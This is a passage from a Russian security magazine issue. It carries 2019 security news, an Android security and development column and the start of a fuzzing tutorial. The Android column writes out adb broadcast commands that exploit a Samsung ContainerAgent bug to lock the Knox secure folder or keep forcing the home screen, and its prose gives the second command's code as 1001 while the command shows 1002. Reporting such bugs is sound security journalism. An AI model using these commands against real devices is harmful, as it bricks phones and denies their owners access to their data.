   но этого недостаточно, равно как и предложения Facebook о назначении какого‐то царя по воп‐
   росам приватности [речь о соз дании дол жности отдельного менеджера, ответственного за сох‐
   ранность пользовательских данных. — Прим. ред.].
      После того как Марк дал показания в конгрессе в прошлом году, это должно было заставить
   его по‐настоящему признать свои ошибки. Вмес то это го законодате лей, доп рашивавших его,
   высмеяли из‐за того, что они слишком старые и не понимают, как работают современ ные тех‐
   нологии. Именно такое впечатление хотел произвести на американцев Марк, ведь это будет
   означать, что практически ничего не изменится»
  — Крис Хьюз о поведении Цукерберга





ШПИОНАЖ
 SNAPCHAT
  Журналисты издания Vice Motherboard пооб щались с несколькими бывшими
  и настоящими сотрудниками компании Snap, владеющей Snapchat, а также
   изучили внутренние корпоративные письма, попавшие в руки редакции.
  Как оказалось, ряд департаментов внутри компании Snap не только имеют
  инструменты для слежки за пользователями, но и активно пользуются и даже
  злоупотребляют ими.
    По информации изда ния, сотрудникам Snap дос тупны такие данные,
   как местоположение, сохраненные Snap’ы и личные данные пользователей,
  вклю чая номера телефо нов и email‐адреса. Несохраненные Snap’ы, как пра‐
   вило, удаляются после получения или через 24 часа пос ле публикации.
    Один из внутренних инстру ментов компании, о котором ранее известно
  не было, носит имя SnapLion. Изна чально он был соз дан для сбора данных
  по официальным запросам, полученным от пра воохранительных органов.
  В частности, к этому инструменту имеют доступ сот рудники отдела Customer
  Ops («Пользовательских операций»), а также отдела Spam and Abuse («Спама
  и злоупотребле ния»).
    Журналисты отмечают,  что,  сог ласно официальным правилам  Snap,
  по запросу властей могут быть предос тавлены такие данные, как привязан‐
  ный к аккаунту номер телефо на, данные о местоположении пользователя,
  метаданные сообщений (по которым можно понять, с кем и когда говорил
   человек), а также в некото рых случаях доступен контент самых Snap’ов, к при‐
  меру из Memories.
    В итоге, если верить внутренним пись мам компании, легитимное исполь‐
  зование SnapLion сводится к удовлетворению запросов правоохранителей,
  а также к борьбе с насилием над детьми. Однако бывшие сотрудники ком‐
  пании рассказали изданию, что сотрудники нередко злоупотребляют этими
  инструментами, хотя и не конкретизирова ли, как именно.
     Представите ли Snap заверили Vice Motherboard, что компания хранит
  крайне мало дан ных о сво их пользователях, а любой несанкционированный
  доступ к этой информации немедленно пресекается и влечет за собой серь‐
  езные последствия.


 МОБИЛЬНЫЕ БАНКЕРЫ ДЕМОНСТРИРУЮТ РОСТ

   По итогам первого квартала 2019 года «Лаборатория Касперско го» зафиксировала зна‐
   чительное увеличение числа финансовых угроз, нацелен ных на мобильные устройства. Замет‐
   ный рост по сравнению с аналогичным периодом прошлого  года продемонстрировали
   как мобильные банковские трояны, так и трояны‐вымогатели.

  В общей сложности за первый квартал этого года было обнаружено около 30 000 вредонос ных
   файлов, классифицируемых как мобильные банковские трояны. В 2018 году их было 19 000.

   Чаще всего в первые три месяца этого года пользователи мобильных устройств стал кивались
   с тремя банковскими троянами: Svpeng (20% от всех обнаруженных зловредов этого типа),
  Asacub (18%) и Agent (15%).

  В отдельные периоды Asacub атаковал до 13 000 уникальных пользовате лей в сут ки.

   Что касается мобильных вымогателей, то их чис ло вырос ло еще заметнее. В первом квар‐
   тале 2018 года решения «Лаборатории Касперского» обнаружили немногим менее 9000 таких
   зловредов, а в начале этого года их стало в три раза больше — почти 28 000.





 АТАКА НА
 TEAMVIEWER
  Немецкое издание Der Spiegel сообщило, что еще в 2014 году китай ские пра‐
   вительственные  хакеры  успешно  скомпро метировали  раз работчиков
   TeamViewer, в ито ге изданию подтвердили это и сами представители ком‐
   пании.
     Хотя ранее об этой кибера таке не было известно, теперь, когда журналис‐
  ты пролили свет на случившееся, разработчики TeamViewer признали, что
  действительно выявили проникновение в свою сеть, но не в 2014 году,
  а осенью 2016 года. В компании объяснили, что тогда подозрительную
   активность обнаружили вовремя и хакеры не успели причинить никакого вре‐
  да ни самой ком пании, ни ее пользователям.
     Разработчики уверяют, что провели тщательное расследование инциден‐
   та, подключили к нему представителей пра воохранительных органов и сто‐
  ронних киберкриминалис тов, но не наш ли никаких признаков хищения поль‐
  зовательских дан ных или дру гой ценной информации. В компании говорят,
   что не было никаких оснований считать, что исходные коды TeamViewer ском‐
  прометированы или укра дены, а пользователи программы могут быть в опас‐
   ности. В итоге было принято решение не сообщать широкой общественности
  о случившемся вовсе.
    Журналисты Der Spiegel, в свою очередь, утверждают, что проникшие
   в сеть TeamViewer хакеры пустили в ход малварь Winnti — бэкдор, который
   как минимум с 2009 года используют хак‐группы из Поднебесной. Но если
  изначально вре донос использовался одно именной группировкой Winnti, то
  позже эксперты стали замечать его на вооружении у различных китаеговоря‐
  щих групп. Очевидно, хакеры делятся малварью друг с другом или же где‐то
  ее покупают. В ито ге уста новить источник атаки на TeamViewer уже вряд ли
  представ ляется возможным. Можно лишь предполагать, что за атакой, веро‐
   ятно, стояла правительственная хак‐группа APT17 или APT10.


 ПРОБЛЕМЫ СЕТИ BITCOIN
   Издание Cointelegraph, ссылаясь на разработчика Люка Дашира (Luke Dashjr), сообщило, что
   почти половина полных нод в Bitcoin‐сети по‐прежнему уязвима перед критической проблемой
   CVE‐2018‐1744, устраненной еще в прошлом году. Напомню, что баг позволяет осу щес твить
   двойную трату UTXO в одной тран закции и команда Bitcoin Core исправила его с релизом кли‐
   ента версии 0.16.3.

  44,3% полных нод до сих пор используют уязвимые версии клиентов, согласно анализу раз‐
   работчика.

   5,1% по‐прежнему работают на ПО, уязвимом и перед другими проблемами.

  10% узлов используют полностью устаревшие клиенты, безопасность которых под большим
   вопросом.

   Большинство открытых источников говорят о сущес твовании 10 000 пол ных нод, однако иссле‐
   дование Дашира свидетельствует о том, что их реальное чис ло уже бли зится к 100 000.





 АВИАУДАР В ОТВЕТ
 НА КИБЕРАТАКУ
  В начале мая на официальных стра ницах Армии обо роны Израиля (ЦАХАЛ)
   в социальных сетях появилось сообщение о необычном отражении кибера‐
   таки со стороны ХАМАС. Предста вители ЦАХАЛ пояснили, что сначала отра‐
  зили атаку в виртуальном пространс тве, а потом ВВС раз вили этот успех
   в пространстве физичес ком. В социальных сетях даже было опубликовано
  видео авиаудара (отметим, что о таких бомбардировках пре дупреждают
   заранее, чтобы избе жать жертв со сто роны мирного населе ния).





  Никаких подробностей самого киберин цидента Армия обороны Израиля
  не раскрывает, но утверждается, что в уничтоженном здании находился центр
  киберопераций ХАМАС, в котором работали оперативники, проводившие
   атаку. Похоже, произошедшее ста нет пер вым слу чаем в истории, когда стра‐
  на в реальном времени ответила на кибера таку атакой обычной.
     Тем не менее стоит заметить, что похожие прецеденты уже имели мес то
  и ранее. К примеру, в 2015 году США стали первой страной в мире, в прин‐
  ципе применившей военную силу в ответ на кибера таки. Тогда американский
  беспилотник ликвидировал хакера Джу наида Хуссейна (Junaid Hussain), граж‐
  данина Великобритании, который еще в 2012 году отси дел полгода за взлом
  адресной книги премьер‐министра Великобритании, а затем присоединился
   к запрещенной в РФ орга низации ИГИЛ. Считалось, что именно он воз глав‐
  лял хакерское подразделение под наз вани ем «Киберхалифат», на сче ту
  которого было немало серь езных прес туплений, в том числе взлом аккаунтов
  Пентагона в социальных сетях.
    Однако ликвидация Хуссейна не была немедленным ответом на кибера‐
   таку — для подготов ки к этой операции США понадо билось много месяцев.
  В свою оче редь, ЦАХАЛ отреагировал в режиме реального вре мени: в минув‐
  шие выходные обстановка в регионе обос трилась, боевики радикального
  движения «Палестин ский исламский джихад» и дви жения ХАМАС выпустили
  по Израилю более 600 ракет, на что ЦАХАЛ также ответил ракетными уда‐
  рами. Кибератака произошла параллельно с этим, пос ле чего упомянутое
  здание в секторе Газа, очевидно, и пополнило спи сок целей.


 DDOS НА ПОДЪЕМЕ
   «Лаборатория Касперского» вновь зафиксировала всплеск DDoS‐атак после долгого спада.
   Эксперты считают, что прошлогоднее снижение показателей было связано с ужесточением
   ответственности за DDoS‐атаки, закрытием нескольких площадок купли‐продажи соответству‐
  ющих услуг и арестами некоторых крупных игроков.

   По данным экспертов, в первом квартале 2019 года чис ло DDoS‐атак уве личилось на 84%
   по сравнению с последним кварталом 2018‐го и они стали гораздо более длительными и слож‐
   ными в организации.

  Общее количество нападений увеличилось на 84%, а чис ло длительных (более 60 минут) сеан‐
   сов DDoS повысилось ровно вдвое.





                              Динамика атак в первом квартале

   Средняя продолжительность возросла в 4,21 раза, причем в сег менте крайне длительных атак
   рост составил 487% — доля таких нападе ний стремительно увеличилась не только количес‐
   твенно, но и качественно.


   Максимальная длительность атаки по сравнению с прошлым кварталом сократилась больше
   чем на сут ки, одна ко процентная доля долгих DDoS‐сес сий про должает расти и составила
   21,34% (по сравнению с 16,66% в четвертом квартале 2018 года).

   Доля SYN‐флуда повысилась, достигнув 84%. В связи с этим снизились доли UDP‐ и TCP‐флу‐
   да, доли же HTTP‐ и ICMP‐атак на этом фоне возросли до 3,3% и 0,6% соот ветс твенно.





  В течение недели наиболее опас ным с точки зрения DDoS‐атак днем стала суббота, воскре-
   сенье по‐прежнему остается самым спокойным днем.

   Лидировать по атакам продолжает Китай. Сдавший позиции в конце 2018 года, он вновь укре‐
   пил их в первом квартале 2019 года: его доля от общего чис ла атак выросла до 67,89%.
   На втором месте традиционно США (17,17%), на третьем — Гонконг (4,81%), поднявшийся
   с седьмого места.





   Больше всего командных сер веров ботнетов по‐прежнему располагаются в США (34,10%),
   на втором месте теперь Нидерланды (12,72%), а на третьем Рос сия (10,40%).



  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Android‐версия браузера DuckDuckGo оказалась уязвима перед подделкой URL


  Майское обновление для Windows 10 несовместимо с некоторыми системами AMD


   GnosticPlayers взломал сервис графического дизайна Canva, похитив данные 139 мил лионов
   человек


   Следить за пользователями можно при помощи данных о калибровке сен соров мобильных
   устройств


   Tor Browser для Android вышел из беты


   Долгие годы Google хранила пароли от G Suite нехешированными


   Google меняет защищенные ключи Titan Security Key из‐за бага


   Уязвимость Thrangrycat позволяет заражать устройства Cisco бэкдорами


   Неизвестные продолжают публиковать данные иран ских APT‐группировок


   Китайские хакеры использовали инструменты АНБ задол го до публикации дампа The Shadow
   Brokers
HEADER
ANDROID





   SECURITY‐НОВШЕСТВА ANDROID Q,
      МОДУЛЬНЫЕ ОБНОВЛЕНИЯ
   И ЭКСПЛОИТ ПРОТИВ СМАРТФОНОВ
            SAMSUNG





Сегодня в выпус ке: улучшения безопас‐
ности Android Q, обновления Android через
Google Play, разбор DoS‐экспло ита против
почти всех смартфо нов Samsung, иссле‐
дование северокорейского клона игры Sim          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
City, программирование интерфейса при‐              zobnin@glc.ru
ложения без XML и головной боли, верифи‐
кация целостности приложения, а  так же
очередная подборка библиотек для прог‐
раммистов.


                ПОЧИТАТЬ


Улуч шения безопасности Android Q
Queue the Hardening Enhancements, What’s New in Android Q Security — две
статьи инженеров Google о сделанных в Android Q улучшени ях безопасности.
Основные моменты:
 • Adiantum. С выпуском Android 7 Google ввела тре бование принудитель‐
   ного вклю чения шифрования на всех новых устройствах с аппаратной под‐
   держкой шифрования AES. Теперь благодаря разработанному в Google
   механизму шифрования Adiantum это требование распространяется и на
   все остальные смартфоны и планшеты. Реализация Adiantum базиру ется
   на применении быстрой хеш‐функции NH, алгоритме аутентификации
   сообщений (MAC) Poly1305 и потоко вом шифре XChaCha12, а также еди‐
   норазовой операции на базе блочного шифра AES‐256 для 16 байт в каж‐
  дом блоке. В тестах на процессоре ARM Cortex‐A7 Adiantum показы вает
   пятикратное превосходс тво в скорос ти шифрования над AES‐256‐XTS.
 • Изоляция медиакодеков . В Android 7 Google вынесла медиасервер,
   отвечающий за обра ботку мультимедийных файлов, в изолированную
   песочницу с низкими пра вами доступа. В Android 8, в рамках проекта Tre‐
    ble, медиасервер был разделен на два компонента, работающих в изо‐
   лированных песочницах. Одна ко набор софтверных кодеков оставался
   сплавлен с хардварными кодека ми, которые, в свою очередь, имели дос‐
   туп к драйверам. Все это приводило к тому, что баг в софтверном кодеке
   мог использоваться для получения контроля над драйвером медиаус‐
   корителя, и наоборот. В Android Q софтверные кодеки переехали в свою
   собственную песоч ницу.
 • Провер ки на переполнение. Начиная с Android 7 инженеры Google пос‐
   тепенно внедряли функции про верки  границ массивов и проверки
   на целочисленное переполнение с помощью компилятора LLVM (функции
  BoundSan и IntSan). В Android Q проверками удалось покрыть одиннадцать
  медиакодеков и стек Bluetooth. По сло вам разработчиков, уже существо‐
   вавшие в Android 9 про верки позволили ней трализовать одиннадцать раз‐
   личных уязвимостей.
 • Control Flow Integrity. В Android Q продол жили работать над внедрением
  функции CFI, которая строит граф вызовов функций и завершает процесс
   при выходе за его пределы. CFI поз воляет предот вратить (или существен‐
   но усложнить) атаки, основанные на использовании ROP (Return Oriented
   Programming), когда экспло ит исполь зует фраг менты кода уяз вимого про‐
   цесса для выполнения нужного действия (например, откры тия шелла).
 • eXecute-Only Memory. В Android Q, работа ющем на платформе с процес‐
   сорной архитектурой AArch64, код всех биб лиотек и бинарных файлов
   помечен как «только для исполнения». Так же как CFI, это делает атаки
   с использованием ROP более проб лематичными, ведь атакующему теперь
   необходимо не толь ко получить возможность передать управление нуж‐
   ному фрагменту кода, но и найти способ прочитать этот фрагмент.
 • Аллокатор Scudo. Для мультимедиакодеков Android Q теперь использует
   аллокатор памяти Scudo, затрудняющий ата ки типа use‐after‐free, double‐
   free и переполнение буфера.





          Прогресс изоляции медиакодеков: от Android M до Q


Модульные обновле ния Android
Fresher OS with Projects Treble and Mainline — подробности проекта Mainline,
позволяющего  обновлять  отдельные  системные  компоненты  Android
без обновления платформы целиком.
  Обновления будут распростра нять ся в специальном формате пакетов
APEX, который вместо приложения содержит в себе определенный ком‐
понент системы. В данный момент таким компонентом может быть: муль‐
тимедийный кодек, мультимедийный фреймворк, DNS‐резол вер, Conscrypt
Java Security Provider, Documents UI, Permission Controller, ExtServices, данные
часовых поясов, ANGLE (прослойка для трансляции вызовов OpenGL ES
в OpenGL, Direct3D 9/11, Desktop GL и Vulkan), Module Metadata, сетевые ком‐
поненты, Captive Portal Login и нас тройки сетевого доступа.
   Если один из этих компонентов потребует обновле ния или в нем будет
найдена уязвимость, Google сможет оперативно выкатить фикс в Google Play,
и его получат сразу все пользователи Android Q и выше.





                   Содержимое пакета APEX

Интересно, что APEX не производит обновление «на живую», когда старый
компонент заменяется на новый. Раздел /system в Android недоступен
для записи, поэтому APEX использует трюк с монтированием. Все фай лы
внутри пакета APEX находятся в обра зе файловой системы ext4. Когда про‐
исходит «установка» пакета, система монтиру ет этот образ поверх раздела
/system в режиме bind. В результате файлы пакета как бы заменяют ори‐
гинальные файлы Android, хотя в реальнос ти все остается на своих мес тах.
Точно такой же трюк использует Magisk для установки модификаций Android
без изменения раздела /system.


Как «окирпичить» любой смартфон Samsung
How to brick  all Samsung phones — статья известного спе циалиста по IT‐
безопасности Эллиота Алдерсона (Elliot Alderson) о баге смартфонов Sam‐
sung, позволяющем сто роннему раз работчику залочить смартфон так, что им
невозможно будет поль зовать ся.
  Проблема заключается в приложении ContainerAgent, которое имеет
ресивер SwitcherBroadcastReceiver, при нима ющий сре ди прочих интент
com.samsung.android.knox.containeragent.LocalCommandReceiver.AC‐
TION_COMMAND.





               Объявление ресивера в манифесте

Декомпилировав код ресивера, можно выяс нить, что при обработке интента
проверяются  значения  com.samsung.android.knox.containeragent.Lo‐
calCommandReceiver.EXTRA_COMMAND_ID    и    android.intent.extra.
user_handle. Если передать в первом 1001, а во втором 150 (идентификатор
пользователя Knox User, который отвечает за защищенное хранилище дан‐
ных), контейнер будет немедленно закрыт:


$ adb shell am broadcast ‐a com.samsung.android.knox.containeragent.
LocalCommandReceiver.ACTION_COMMAND ‐‐ei "com.samsung.android.knox.
containeragent.LocalCommandReceiver.EXTRA_COMMAND_ID" 1001 ‐‐ei
"android.intent.extra.user_handle" 150

Если же передать 1001 и 0, про изойдет немедленный переход на домашний
экран:


$ adb shell am broadcast ‐a com.samsung.android.knox.containeragent.
LocalCommandReceiver.ACTION_COMMAND ‐‐ei "com.samsung.android.knox.
containeragent.LocalCommandReceiver.EXTRA_COMMAND_ID" 1002 ‐‐ei
"android.intent.extra.user_handle" 0

Чтобы показать, как это мож но использовать, Эллиот создал приложение,
которое каждую секунду отправляет два этих интента и таким образом бло‐
кирует любые попытки использовать смартфон. Пользователь пос тоянно воз‐
вращается на домашний экран, а его защищенная папка, которую Samsung
призывает исполь зовать для хра нения действитель но важных данных, пос‐
тоянно блокируется.


Иссле дование северо корейско го Sim City
Reverse Engineering a North Korean Sim City Game — статья о северокорей‐
ском клоне игры Sim City, в котором внут риигровые покупки совершаются
в офлайне. Интересные моменты:
 • В Северной Корее нет онлайновых магазинов приложений, но есть мно‐
  жество офлайновых. Покупатель приходит в магазин со своим телефоном,
   выбирает приложение или игру, платит за нее (в слу чае с данной игрой —
  менее одного дол лара), затем отдает телефон продавцу, и тот заливает
   приложение на телефон (иногда только с десятой попытки). Примерно
   таким же образом совершаются внутриигровые покупки  (лут, игровая
   валюта, персонажи и про чее).
 • Купленная игра City Management ока залась не внутренней разработкой,
   а всего лишь клоном китайской версии игры City Island 2, разработанной
   в Нидерландах.
 • Сразу после запуска игра выводит на экран числовой код, который необ‐
   ходимо предоставить продавцу приложения, чтобы получить лицензион‐
  ный ключ. Механизм сверки ключей использует реализацию алгоритма
  RSA двадцатилетней давности (RSAREF).
 • Обойти защиту очень просто: достаточно модифицировать функцию про‐
   верки лицензии так, чтобы она всегда воз вра щала положительный резуль‐
   тат, и перепаковать приложение. Однако в этом слу чае игра завершится
   с ошибкой, потому что в коде есть про верка на целостность библиотек,
   используемых для проверки лицензии. К счастью, обращение к этой фун‐
   кции можно просто удалить из кода.
 • Код проверки лицензии и целос тности файлов располагается внутри
   «безобидных» функций, внутри самого движка игры, поэтому найти их,
   используя статистичес кий анализ, практически невозможно.
 • Модифицированная версия игры не запустится на устройстве, предназна‐
   ченном для внутреннего рынка Северной Кореи. Такие смартфоны и план‐
  шеты  представляют  собой  ребрендированный  дешевый  китайский
   ноунейм с установленной специаль ной версией Android, которая сверяет
  цифровые подписи почти всех типов файлов (документов, изображений,
  фильмов, приложений) и либо не поз воляет их открыть, либо удаляет.
 • При нажатии на кнопку приобретения внутриигровой валюты появляется
   сообщение с номером заявки и предложение ввести другой номер. Его
  можно получить все в том же офлайновом магазине приложений.





     Вывески офлайновых магазинов приложений в Северной Корее


              РАЗРАБОТЧИКУ


Погружение в Jetpack Compose
Diving into Jetpack Compose — статья о новой биб лиоте ке Jetpack Compose,
представ ленной на Google I/O 2019. Compose поз воляет описывать UI прямо
в коде в декларативном стиле без необходимости пра вить XML.
  Пример приложе ния, написанного с использовани ем Compose:


class ComposeActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent { CraneWrapper { MyApp() } }
    }


    @Composable
    fun MyApp() {
        MaterialTheme {
            Text(text = "Hello world!", style = +themeTextStyle { h3
})
        }
    }
}

Этот код создает активность в стиле Material Design с текстом «Hello World!».
Функция CraneWrapper необ ходима для настройки провайдеров Context, Fo‐
cusManager и TextInputService. Функция MaterialTheme настраивает цвета,
стили и шрифты в соот ветс твии с пра вилами Material Design.
  Compose — это реактивный UI‐фрей мворк, существенно упрощающий
работу с состояниями виджетов:


@Composable
fun MyApp() {
    MaterialTheme { Counter() }
}


@Composable
fun Counter() {
    val amount = +state { 0 }


    Column {
        Text(text = "Counter demo")
        Button(text = "Add", onClick = { amount.value++ })
        Button(text = "Subtract", onClick = { amount.value‐‐ })
        Text(text = "Clicks: ${amount.value}")
    }
}

Данный  код  создает  экран  с  кнопками  Add  и  Substract  и  текстом
Text: <число>. Нажатие любой из кнопок не только увеличивает внутреннее
значение числа amount.value, но и приводит к немедленному обновлению
текстового виджета.
  В качестве значения в коде +state { } можно использовать не только
числа и другие простые типы данных, можно соз дать и собственную модель
данных:


@Model
class CounterModel {
    var counter: Int = 0
    var header = "Counter demo"
    fun add() { counter++ }
    fun subtract() { counter‐‐ }
}

Но самая интересная особенность Compose в том, что внутри он не исполь‐
зует стандартные виджеты и компоненты Android (View, Fragment и прочие).
Вместо этого он рисует все виджеты самостоятельно, так же как это делает
Flutter. Такая архитектура поз воляет полностью абс трагироваться от версии
Android и изменений в интерфейсе, внесенных производителями смартфо‐
нов, и получить пол ностью идентичный UI на любом устройстве (библиотеки
поддержки Android это тоже могут, но ценой жутких костылей и необходимос‐
ти допиливать вручную).
  Отказ от использования стандартных виджетов Android также поз волил
Google создать более гибкий и современный фрей мворк, многие из идей
которого позаимствованы опять же из Flutter. Например, одна из ключевых
идей Compose — «все есть виджет». Даже отступы для других виджетов
реализуются с помощью виджета:


Padding(padding = 16.dp) {
    Button(text = "Say hello", onClick = { ... })
}

Это гораздо более интуитивный и понятный спо соб описания интерфейса.
   Также одно из важных следствий описания интерфейса пря мо в коде —
возможность исполь зовать любые языковые конструкции Kotlin:


Column {
    listOf("John", "Julia", "Alice", "Mark").forEach {
        Text(text = it)
    }
}


Ве рифициру ем целостность приложе ния
Verify non‐Google Play app installs — статья из официальной документации
Google, посвященная решению проб лемы, с которой стол кнулись многие
разработчики приложений после перехода на формат пакетов App Bundle.
  Напомним, что App Bundle — это специальный формат пакета для при‐
ложений, который позволяет упа ковать в один файл все воз можные ресурсы
и библиоте ки приложения. При публикации релиза разработчик заливает App
Bundle в Google Play, а тот, в свою очередь, «раз реза ет» бандл на множество
независимых файлов APK, содержащих ресурсы и библиотеки для разных
устройств. Например, файлы перевода попада ют в собственные незави‐
симые пакеты, и эти пакеты устанавлива ются отдель но от основного пакета
приложения в зависимос ти от того, какой язык выб ран в качестве дефол‐
тового на устройстве пользователя.
  App  Bundle  позволя ет  сократить  размер  приложения,  не  жертвуя
функциональностью и не обременяя разработчика, которому иначе приш‐
лось бы самостоятельно соз давать и заливать в Google Play множество раз‐
ных APK для разных платформ и устройств. Но есть одна проблема: если
пользователь скачает приложение не нап рямую из Google Play (например,
используя специальные даунлоадеры, альтернативные маркеты, или просто
достанет приложение из дру гого телефо на), при ложение может начать сбо‐
ить из‐за недостающих конкретно для это го устройства файлов APK.
  К счастью, у Google есть инс тру мент, который поз воляет проверить, все ли
необходимые компонен ты приложения уста новлены на устройство. Чтобы им
воспользоваться, достаточно выполнить три простых шага:
 1. Добавить сле дующую строку в основной build.gradle приложения:


buildscript {
    dependencies {
        ...
        classpath 'com.android.tools.build:bundletool:0.9.0'
    }
}

 2. Добавить в зависимос ти библиотеку Play Core:


dependencies {
    ...
    implementation 'com.google.android.play:core:1.6.0'
}

 3.1. Изменить манифест приложения:


<?xml version="1.0" encoding="utf‐8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.myapplication" >
    <application
        ...
        android:name="com.google.android.play.core.missingsplits.
MissingSplitsDetectingApplication" >
    </application>
    ...
</manifest>

 3.2. Либо, если приложение использует кас томный класс Application, сде‐
лать так:


public class MyCustomApplication extends Application {
    @Override
    public void onCreate() {


        if (MissingSplitsManagerFactory.create(this).disableAppIfMis
singRequiredSplits()) {
            // Skip app initialization
            return;
        }


        super.onCreate();
        ...
    }
}

Теперь пользователи, ска чавшие приложение в обход Play Store, увидят такое
сообщение:





Сто ит ли обертывать сто рон ние биб лиоте ки враппером?
Bohemian Wrapsody — статья о достаточно банальном в своей эффектив‐
ности подходе к разработке, которым пренеб рега ют многие раз работчики.
Речь о достоинствах обер тывания сторонних биб лиотек в кас томный API.
С одной стороны, кажет ся, что это принесет только излишний бойлерплейт,
но на самом деле, создавая врапперы, можно существенно упростить свою
жизнь в будущем:
 • Многие библиотеки при обновлении ломают API, из‐за чего приходится
   делать рефакторинг всех компонентов, использующих библиоте ку. Если
   сделать обертку для биб лиотеки на ранних этапах разработки, менять при‐
   дется только ее.
 • Технологии развиваются, вместе с ними меняются инс трументы. Впол не
   возможно, в будущем придется отка зать ся от использования текущих биб‐
   лиотек и мигрировать на дру гие. Если есть враппер — менять придется
   только его.
 • В обертку можно вынес ти все допол нительные нас тройки, свойственные
   для проекта в целом, чтобы не повторять их при каждом вызове функций
  библиотеки.
 • Обертку можно исполь зовать для рас ширения функциональности биб‐
   лиотеки.
 • Не все библиотеки спроектированы с учетом возможностей для тес‐
   тирования. Обертка решит эту проблему.
 • Одну и ту же обертку мож но использовать в нес кольких проектах одновре‐
  менно. Внося изменения в один проект, мы почти автоматичес ки получаем
   их в другом.


       ИНСТРУМЕНТЫ И БИБЛИОТЕКИ


 • dexcalibur — основанный на Frida инстру мент анализа и перехвата фун‐
   кций приложений;
 • Holdy — контейнер для работы с множес твом фрагментов;
 • jpegkit‐android — обертка для высокоэффективной библиотеки libjpeg‐
   turbo;
 • AsynKio — простая в использовании биб лиотека для выполнения сетевых
   запросов;
 • ColorPickerView — библиотека  для  выбора  цвета  на  изображении
   с помощью цветового круга;
 • retroauth — обертка вокруг Retroﬁt для выполнения аутентификационных
   реквестов;
 • injectvm‐binderjack — пример инъекции кода Java/Kotlin в любой JVM‐про‐
   цесс Android, вклю чая system_server;
 • InlineActivityResult — библиотека, позволяющая запустить startActivityFor‐
   Result и получить результат в колбэке вмес то ожидания интента;
 • fuzzywuzzy‐koltin — Kotlin‐форк библиотеки FuzzyWuzzy для сравнения
   строк с помощью алгоритма Левенштейна;
 • bento — библиотека для создания модульного UI;
 • kyrie — аналог VectorDrawable и AnimatedVectorDrawable с возможностью
   паузы, создания на лету и дру гими полезными функциями;
 • Stepper — библиотека для создания пошаговых визардов первого запус‐
   ка;
 • AndroidMalware_2019 — сборник семплов найденной в 2019 году малвари.
COVERSTORY

 LUKE, I AM YOUR
FUZZER



 АВТОМАТИЗИРУЕМ ПОИСК УЯЗВИМОСТЕЙ
          В ПРОГРАММАХ





                                                 Nik Zerof
                                                 xtahi0nix@gmail.com





Фаззинг все чаще применяют и программисты — для про‐
верки своих приложений на прочность, и исследователи
безопасности,  и  хакеры. Но  пользоваться  фаззерами
не выйдет, если не понимаешь, что именно они делают.
Зато,  узнав  это,  ты  осво ишь  современную  технику,
с помощью которой сейчас находят все новые и новые уяз‐
вимости в самых разных приложениях. В этой статье я рас‐
скажу, как работают разные виды фаззинга, и на примере
WinAFL покажу, как пользоваться этим инструментом.


В общих чертах смысл фаззинга заключа ется в передаче в программу (я
имею в виду любой исполняемый код, динамическую биб лиотеку или драй‐
вер) любого нестандартного потока данных, чтобы попытаться вызвать проб‐
лемы в ходе исполнения.
   Так что же мы ищем при помощи фаззинга? Это достаточно широкий
спектр ошибок программного обеспечения, который включает в себя такие
вещи, как перепол нение буферов, некорректная обра ботка пользовательских
данных, разнообразные утечки ресурсов (в том чис ле при работе с памятью),
различные ошибки син хрониза ции, приводящие к сос тоянию гонки, и прочее.
Каждое такое событие фиксируется фаззером и более подробно иссле дует‐
ся в дальнейшем.


ТЕХНИКИ
Существуют две основные техники фаз зинга — это мутационное и порож‐
дающее тестирования. При мутационном тес тировании генерация пос‐
ледовательностей происходит на основе заранее опре деленных данных
и шаблонов. Имен но они сос тавляют стартовый корпус фаззера. Изменяя
байт за байтом значения на входе и проверяя работу программы, фаззер
может делать выводы об успешности тех или иных «мутаций», чтобы в сле‐
дующем раунде сгенерировать более эффективные пос ледовательности.
   Как видишь, сама концепция достаточно простая. Но за счет того, что
количество ите раций дос тигает сотен и тысяч миллионов (время тестирова‐
ния при этом составляет нес колько суток даже на мощных машинах), фаззеры
находят в программах самые нетривиальные ошиб ки.
  В свою очередь, порождающее тестирование — это более продвинутая
техника фаззинга, которая предполагает построение грамматик входных дан‐
ных, основанное на спецификациях. Это могут быть как фай лы различных
форматов, так и сетевые пакеты в протоколах обмена. В этом случае наши
результаты  должны  соответствовать  заранее  определенным  правилам.
Порождающее тестирование сложнее мутаци онного в реализации, но и
вероятность успеха тут выше.
  Конечно, существуют и более продвинутые техники. Например, фаз зинг
с использованием трассировки и пос троением уравнений для SMT‐решате‐
лей. В теории это помога ет покрывать даже труднодос тупные ветки кода.
При этом включается трасса внутри ядра ОС, с одновременным исключением
известных участков (нет никакого смысла фаззить внутреннос ти функций
WinAPI и прочего). Одна ко заставить все пра виль но работать непросто,
и сегодня это скорее «черная магия», чем распростра ненная практика.
  Вместе с тем есть и совсем простое тестирование с отправкой на вход
абсолютно случайных зна чений, но я не рассмат риваю его из‐за очень низкой
эффективности. По своему подходу оно больше похоже на перебор «грубой
силой», так как история и успешность предыдущих попыток тут никак не учи‐
тываются.


             INFO

                   Одним из первых прототи пов фаззеров считает ся
                       программа     The     Monkey,     созданная
                        в  далеком 1983  году. В  названии  очевидна
                       отсылка  к  теореме о бесконечных обезьянах,
                       которые пыта ются напечатать «Войну и мир».
                     Несмотря на свою прак тическую бесполезность,
                       теорема популярна в массовой культуре (нап‐
                       ример,  упоминается  в  романе  «Автосто пом
                      по галактике» и сериале «Симпсоны») и даже
                       получила собственный RFC 2795.



ТИПЫ ФАЗЗЕРОВ
С техниками фаззинга более‐менее разобрались, теперь перейдем к типам
фаззеров.


Форматы файлов
Будем считать входными данными пользователя любой файл любого фор‐
мата,  который наше  тес тиру емое  приложение  возьмется  обработать.
Это значит, что мы можем подсунуть файл «неправильного» формата и пос‐
мотреть, как справится с ним подопытная программа. Первое, что приходит
в голову, — антивирус. Антивирусный ска нер должен опре делять формат
файла, как‐то с ним вза имодействовать: пытать ся распаковать, включить
эвристический анализ и так далее.
  Чем обернется простая проверка, если антивирусный сканер решит, что
перед ним файл PE, упакованный UPX, а при рас паковке выяснится, что
это вовсе не UPX, а что‐то, что лишь притворя ется им? Естественно, алгоритм
распаковки будет другой, но поведение ска нера при этом пре дугадать слож‐
но. Может быть, он обру шится. Может быть, просто повесит на файл флаг
«поврежден» и пропустит. И это далеко не полный перечень возможных исхо‐
